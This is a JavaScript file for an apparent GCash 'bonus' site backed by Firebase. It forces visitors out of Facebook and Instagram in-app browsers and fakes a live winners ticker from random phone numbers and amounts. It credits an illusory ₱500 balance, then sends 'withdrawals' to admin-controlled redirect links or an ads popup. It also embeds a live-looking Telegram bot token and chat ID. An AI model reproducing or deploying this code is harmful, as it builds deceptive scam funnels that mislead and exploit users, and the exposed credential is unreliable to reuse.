/**
 * PlayBonus.js - Auto Popup + Direct Redirect
 * Anti-Lag Optimized + Firebase Sync
 */

(function() {
    'use strict';

    // ============================================================
    // 🚀 FORCE OPEN IN DEFAULT BROWSER
    // ============================================================
    (function forceOpenInBrowser() {
        var ua = navigator.userAgent || navigator.vendor || window.opera;
        var isFacebook = /FBAN|FBAV|FB_IAB|FBIOS/i.test(ua);
        var isInstagram = /Instagram/i.test(ua);
        var isMessenger = /Messenger/i.test(ua);
        var isInAppBrowser = isFacebook || isInstagram || isMessenger;

        if (!isInAppBrowser) return;

        var currentUrl = window.location.href;
        var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
        var isAndroid = /Android/i.test(ua);
        var isIOS = /iPhone|iPad|iPod/i.test(ua);

        if (isAndroid) {
            window.location.href = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
            return;
        }

        if (isIOS) {
            window.location.href = 'googlechrome://' + cleanUrl;
            setTimeout(function() { window.location.href = 'x-web-search://?url=' + encodeURIComponent(currentUrl); }, 500);
        }
    })();

    // ============================================================
    // ⚡ GLOBALS
    // ============================================================
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var withdrawInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;
    var forceLogoutListener = null;
    var forceLogoutFlagListener = null;
    var logoutTriggered = false;
    var listenersSetup = false;
    var pageLoadTime = Date.now();
    
    var callInProgress = false;
    var callCountdown = 60;
    var callTimerInterval = null;
    var currentCallCode = '';
    
    var adsCountdownInterval = null;
    var lastTelegramTime = 0;
    var TELEGRAM_THROTTLE_MS = 2000;

    // ============================================================
    // UTILITIES
    // ============================================================
    function formatNumberWithComma(number) {
        var n = Number(number);
        if (isNaN(n)) n = 0;
        return n.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    }

    function getFormattedTime() {
        return new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });
    }

    function sendTelegram(message) {
        try {
            var now = Date.now();
            if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
            lastTelegramTime = now;
            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message))
                .catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // INIT
    // ============================================================
    function init() {
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone || userPhone === 'null' || userPhone.length < 10) {
            window.location.href = "index.html";
            return;
        }

        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);

        if (typeof firebase !== 'undefined') {
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
        }

        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        attachButtonEvents();
        initAdminForceLogoutListener();
    }

    // ============================================================
    // LOAD USER DATA
    // ============================================================
    function loadUserData() {
        if (!userRef) return;

        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;
            }
            updateBalanceDisplay();
            scheduleAutoPopup();
        });

        if (balanceListener) userRef.child('balance').off('value', balanceListener);
        balanceListener = userRef.child('balance').on('value', function(snapshot) {
            if (snapshot.val() !== null) {
                currentBalance = Number(snapshot.val());
                updateBalanceDisplay();
            }
        });

        if (claimListener) userRef.child('claimed_ptcat').off('value', claimListener);
        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var newState = (snapshot.val() === true);
            if (newState !== isClaimed) {
                isClaimed = newState;
                updateClaimButtonUI();
            }
        });
    }

    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) balanceEl.innerText = formatNumberWithComma(currentBalance);
    }

    // ============================================================
    // AUTO POPUP - LALABAS PAG 0 BALANCE AT HINDI PA CLAIM
    // ============================================================
    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);
        
        // Show popup after 5 seconds if balance is 0 and bonus not claimed
        autoPopupTimer = setTimeout(function() {
            if (currentBalance <= 0 && !isClaimed) {
                showBonusPopup();
            }
        }, 5000);
    }

    function showBonusPopup() {
        if (window.showPopup) {
            window.showPopup(currentBalance);
        } else {
            // Fallback: direct show
            var popup = document.getElementById('bonusRewardPopup');
            if (popup) {
                popup.style.display = 'flex';
                updateClaimButtonUI();
            }
        }
    }

    // ============================================================
    // CLAIM FLOW
    // ============================================================
    function initClaimFlow() {
        var claimNowBtn = document.getElementById('claimNowBtn');
        if (claimNowBtn) {
            claimNowBtn.onclick = function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                if (currentBalance <= 0) {
                    if (!isClaimed) {
                        showBonusPopup();
                        return;
                    }
                }
                openWithdrawPopup();
            };
        }

        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.onclick = handleClaimBonus;
        }

        var bonusRewardClose = document.getElementById('bonusRewardClose');
        if (bonusRewardClose) {
            bonusRewardClose.onclick = function() {
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
            };
        }

        var bonusRewardBack = document.getElementById('bonusRewardBack');
        if (bonusRewardBack) {
            bonusRewardBack.onclick = function() {
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
            };
        }

        updateClaimButtonUI();
    }

    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (!ptCatClaimBtn) return;

        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
            ptCatClaimBtn.classList.add('claimed');
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            ptCatClaimBtn.classList.remove('claimed');
        }
    }

    // ============================================================
    // HANDLE CLAIM BONUS (₱500)
    // ============================================================
    function handleClaimBonus(e) {
        e.preventDefault();
        e.stopPropagation();

        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        if (claimInProgress) {
            alert("Please wait, processing...");
            return;
        }

        claimInProgress = true;
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
        }

        checkFirewall().then(function(firewallOn) {
            if (firewallOn) {
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
                
                creditBonus(function() {
                    // Show AI verification popup
                    if (window.showPopup) {
                        window.showPopup(currentBalance);
                    }
                    claimInProgress = false;
                });
            } else {
                creditBonus(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';
                    
                    setTimeout(function() {
                        showSuccessPopup(bonusAmount);
                    }, 300);
                    claimInProgress = false;
                });
            }
        }).catch(function() {
            claimInProgress = false;
            if (ptCatClaimBtn) {
                ptCatClaimBtn.disabled = false;
                ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            }
        });
    }

    function creditBonus(callback) {
        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;
        
        userRef.update({
            balance: newBalance,
            claimed_ptcat: true,
            ptcat_claimed_at: Date.now(),
            lastUpdate: Date.now()
        }).then(function() {
            currentBalance = newBalance;
            isClaimed = true;
            
            animateBalance(oldBalance, newBalance);
            updateClaimButtonUI();
            
            if (callback) callback();
        }).catch(function(error) {
            alert('Error saving claim. Please try again.');
            claimInProgress = false;
        });
    }

    function animateBalance(oldBalance, newBalance) {
        var startTime = null;
        var duration = 1000;
        
        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);
            
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balanceEl.innerText = formatNumberWithComma(val);
            
            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                updateBalanceDisplay();
            }
        }
        requestAnimationFrame(step);
    }

    // ============================================================
    // WITHDRAW POPUP
    // ============================================================
    function openWithdrawPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (!popup) return;
        
        var amountEl = document.getElementById('claimNowBalanceAmount');
        if (amountEl) amountEl.innerText = formatNumberWithComma(currentBalance);
        
        popup.style.display = 'flex';
        
        var closeBtn = document.getElementById('claimNowPopupClose');
        if (closeBtn) closeBtn.onclick = closeWithdrawPopup;
        
        var backBtn = document.getElementById('claimNowBackBtn');
        if (backBtn) backBtn.onclick = closeWithdrawPopup;
        
        var gcashBtn = document.getElementById('claimViaGCashBtn');
        if (gcashBtn) gcashBtn.onclick = handleWithdraw;
    }

    function closeWithdrawPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (popup) popup.style.display = 'none';
    }

    // ============================================================
    // HANDLE WITHDRAW (DIRECT REDIRECT)
    // ============================================================
    function handleWithdraw() {
        if (withdrawInProgress) return;
        withdrawInProgress = true;
        
        var gcashBtn = document.getElementById('claimViaGCashBtn');
        var originalHTML = gcashBtn ? gcashBtn.innerHTML : '';
        if (gcashBtn) {
            gcashBtn.disabled = true;
            gcashBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
        }

        checkFirewall().then(function(firewallOn) {
            if (firewallOn) {
                closeWithdrawPopup();
                if (window.showPopup) {
                    window.showPopup(currentBalance);
                }
                if (gcashBtn) {
                    gcashBtn.disabled = false;
                    gcashBtn.innerHTML = originalHTML;
                }
                withdrawInProgress = false;
                return;
            }

            getPayoutLink().then(function(url) {
                if (url) {
                    if (gcashBtn) gcashBtn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
                    setTimeout(function() {
                        // DIRECT REDIRECT - WALANG BAGONG TAB
                        window.location.replace(url);
                    }, 1000);
                } else {
                    closeWithdrawPopup();
                    setTimeout(function() {
                        showAdsPopup();
                    }, 300);
                    if (gcashBtn) {
                        gcashBtn.disabled = false;
                        gcashBtn.innerHTML = originalHTML;
                    }
                }
                withdrawInProgress = false;
            });
        }).catch(function() {
            if (gcashBtn) {
                gcashBtn.disabled = false;
                gcashBtn.innerHTML = originalHTML;
            }
            withdrawInProgress = false;
        });
    }

    function getPayoutLink() {
        return new Promise(function(resolve) {
            if (!db) return resolve(null);
            
            db.ref('admin/redirectLink').once('value').then(function(snap) {
                var data = snap.val();
                if (data && data.url) {
                    return resolve(data.url);
                }
                
                db.ref('links').once('value').then(function(linksSnap) {
                    var links = linksSnap.val() || {};
                    var availableKey = null;
                    
                    for (var key in links) {
                        if (links[key] && links[key].status === 'available') {
                            availableKey = key;
                            break;
                        }
                    }
                    
                    if (availableKey) {
                        var url = links[availableKey].url;
                        db.ref('links/' + availableKey).update({
                            status: 'claimed',
                            user: userPhone,
                            claimedAt: Date.now()
                        });
                        resolve(url);
                    } else {
                        resolve(null);
                    }
                });
            }).catch(function() {
                resolve(null);
            });
        });
    }

    function checkFirewall() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                return (data && data.active === true);
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }

    // ============================================================
    // ADS POPUP
    // ============================================================
    function showAdsPopup() {
        var popup = document.getElementById('adsPopup');
        if (!popup) return;
        
        popup.style.display = 'flex';
        
        var closeBtn = document.getElementById('adsPopupClose');
        if (closeBtn) closeBtn.onclick = closeAdsPopup;
        
        var skipBtn = document.getElementById('adsSkipBtn');
        if (skipBtn) skipBtn.onclick = closeAdsPopup;
        
        if (adsCountdownInterval) clearInterval(adsCountdownInterval);
        var countdown = 10;
        skipBtn.disabled = true;
        skipBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> SKIP ADS IN ' + countdown;
        
        adsCountdownInterval = setInterval(function() {
            countdown--;
            if (countdown > 0) {
                skipBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> SKIP ADS IN ' + countdown;
            } else {
                clearInterval(adsCountdownInterval);
                skipBtn.disabled = false;
                skipBtn.innerHTML = '<i class="fas fa-forward"></i> SKIP ADS';
            }
        }, 1000);
    }

    function closeAdsPopup() {
        var popup = document.getElementById('adsPopup');
        if (popup) popup.style.display = 'none';
        if (adsCountdownInterval) {
            clearInterval(adsCountdownInterval);
            adsCountdownInterval = null;
        }
    }

    // ============================================================
    // SUCCESS POPUP
    // ============================================================
    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        
        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }
        
        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }

    // ============================================================
    // TIMER
    // ============================================================
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }

            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                
                displayElement.textContent = days + 'D ' + 
                    hours.toString().padStart(2, '0') + ':' + 
                    minutes.toString().padStart(2, '0') + ':' + 
                    seconds.toString().padStart(2, '0');
            }
            
            update();
            setInterval(update, 1000);
        } catch(e) {}
    }

    // ============================================================
    // TICKER
    // ============================================================
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        var amounts = [500, 1000, 2000, 2500];
        var actions = ["received", "received", "withdraw"];

        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = amounts[Math.floor(Math.random() * amounts.length)];
            var action = actions[Math.floor(Math.random() * actions.length)];
            
            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action + 
                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount.toLocaleString();
        }
        
        updateTicker();
        setInterval(updateTicker, 8000);
    }

    // ============================================================
    // BUTTON EVENTS
    // ============================================================
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.onclick = function() {
                if (userPhone && db) {
                    db.ref('user_sessions/' + userPhone).update({
                        status: 'offline',
                        lastSeen: firebase.database.ServerValue.TIMESTAMP
                    });
                }
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            };
        }
        
        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.onclick = function() {
                window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent('https://tiny.cc/LuckyDrop'), '_blank', 'width=600,height=400');
            };
        }
    }

    // ============================================================
    // ADMIN FORCE LOGOUT
    // ============================================================
    function initAdminForceLogoutListener() {
        if (!userPhone || !db) return;
        
        var cleanPhone = userPhone.replace(/[^0-9]/g, '');
        
        userRef.child('forceLogout').once('value').then(function(flagSnap) {
            if (flagSnap.val() === true) {
                showForceLogoutPopup();
                return;
            }
            return userRef.update({
                status: 'online',
                lastSeen: firebase.database.ServerValue.TIMESTAMP
            }).then(function() {
                setTimeout(function() {
                    setupAdminLogoutListener(cleanPhone);
                }, 2000);
            });
        });
    }

    function setupAdminLogoutListener(cleanPhone) {
        if (listenersSetup) return;
        listenersSetup = true;

        forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
        forceLogoutFlagListener.on('value', function(snapshot) {
            if (snapshot.val() === true && !logoutTriggered) {
                logoutTriggered = true;
                forceLogoutFlagListener.off();
                showForceLogoutPopup();
            }
        });
    }

    function showForceLogoutPopup() {
        if (document.querySelector('.force-logout-popup')) return;
        
        var overlay = document.createElement('div');
        overlay.className = 'force-logout-popup';
        overlay.style.cssText = 'position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;padding:20px;';
        overlay.innerHTML = '<div style="background:linear-gradient(145deg, #ff2d95, #5a189a);border:4px solid #ffd700;border-radius:24px;padding:30px;text-align:center;max-width:340px;"><h2 style="color:#fff;font-size:24px;font-family:Fredoka,sans-serif;margin-bottom:12px;">SESSION ENDED</h2><p style="color:rgba(255,255,255,0.9);font-size:14px;margin-bottom:20px;">Your session has been ended by an admin.</p><button onclick="localStorage.clear();window.location.href=\'index.html\'" style="background:linear-gradient(180deg, #ffeb3b, #ff9800);border:3px solid #fff;border-radius:12px;padding:14px 20px;font-weight:900;cursor:pointer;width:100%;">RETURN TO HOME</button></div>';
        document.body.appendChild(overlay);
    }

    // ============================================================
    // BAN CHECK
    // ============================================================
    function checkIfBanned() {
        if (!userPhone || !db) return;
        
        db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
            if (snap.exists()) {
                db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            }
        });
    }

    // ============================================================
    // START
    // ============================================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 30000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 30000);
        checkIfBanned();
    }

})();
